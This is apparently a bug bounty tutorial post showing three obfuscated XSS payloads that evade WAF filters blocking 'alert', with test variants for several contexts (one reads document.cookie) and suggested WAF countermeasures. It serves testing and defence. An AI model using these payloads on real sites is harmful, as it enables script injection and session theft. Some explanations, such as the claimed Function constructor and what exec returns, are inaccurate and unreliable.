# 🎓 XSS WAF Bypass: 3 Tricks to Beat Alert Blockers 🎓
![3 Tricks to Beat Alert Blockers](https://github.com/user-attachments/assets/ad767944-9c7b-4664-8f04-b13b3a5198be)

Modern WAFs often block the word "alert" in XSS payloads, but JavaScript's flexibility lets you reconstruct it dynamically. Here are three powerful obfuscation techniques that bypass keyword-based filters by breaking, encoding, or dynamically generating the alert function.

## 🔥 Trick 1: Template Literal + Function Constructor

```javascript
(function(x){this[x+`ert`](1)})`al`
```

**How It Works:**

- `al` is a tagged template literal passed as argument x  
- `x +ert`` → "al" + "ert" = "alert"  
- `this["alert"](1)` executes in global scope  
- No direct alert string appears in code  

---

## 🛠 Trick 2: Regex + Dynamic Property Access

```javascript
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
```

**How It Works:**

- `/e/[ex+ec]e`` is advanced JavaScript trickery  
- `/e/` is a RegExp object  
- `[ex+ec]` accesses property named exec  
- `/e/['exec']` returns the exec function as a string  
- Result builds "alert" character by character  

---

## 💡 Trick 3: Unicode Escaping

```javascript
document['default'+'View'][`\u0061lert`](3)
```

**How It Works:**

- `\u0061` is Unicode for lowercase a  
- Combined with lert forms "alert"  
- Accesses via `document.defaultView` (same as window)  
- Unicode encoding bypasses simple string matching  

---

## ⚡️ Why These Bypass WAF Filters

- No Direct "alert" String: The word is split, encoded, or constructed dynamically  
- JavaScript Weirdness: Uses obscure language features WAF regex doesn't anticipate  
- Context Evasion: Template literals, regex properties, and Unicode aren't in standard XSS signatures  
- Multi-Stage Execution: WAF sees fragments, browser executes final result  

---

## 🎯 Testing Methodology

**Start Simple:** Test basic `alert(1)` to confirm WAF blocks it  

**Try Each Bypass:** Test the three techniques above  

**Combine & Customize:** Mix approaches for your specific target  

**Test Different Contexts:** HTML attributes, script tags, JavaScript events  

### Example Test Variations

```html
<!-- HTML Attribute Context -->
<img src=x onerror=(function(x){this[x+`ert`](document.cookie)})`al`>

<!-- Script Tag Context -->
<script>window[`al`+/e/[`ex`+`ec`]`e`+`rt`](location.href)</script>

<!-- URL Context -->
javascript:document['default'+'View'][`\u0061lert`](document.domain)
```

---

## 🛡 How WAFs Could Block These

- Normalize Unicode: Convert `\u0061` to `a` before analysis  
- Detect Obfuscation Patterns: Flag suspicious string concatenation  
- Execute JavaScript Simulation: Use JS engine to evaluate obfuscated code  
- Context-Aware Rules: Understand HTML/JS parsing boundaries  

---

## 💰 Bug Bounty Impact

- High Severity: XSS remains one of the most common and dangerous vulnerabilities  
- WAF Bypass Adds Value: Demonstrates deeper security understanding  
- Chain Potential: Combine with CSRF, session hijacking, or credential theft  
- Enterprise Relevance: Many organizations rely on WAFs for protection  

---

🔔 Follow **@cybersecplayground** for more XSS and WAF bypass techniques!

✅ Like & Share if you bypassed a WAF with these tricks! 🔥

---

**#XSS #WAFBypass #BugBounty #WebSecurity #CyberSecurity #JavaScript #Hacking #PenTesting**

⚠️ **Pro Tip:** Test these in browser consoles and on bug bounty targets, but always respect scope and authorization!
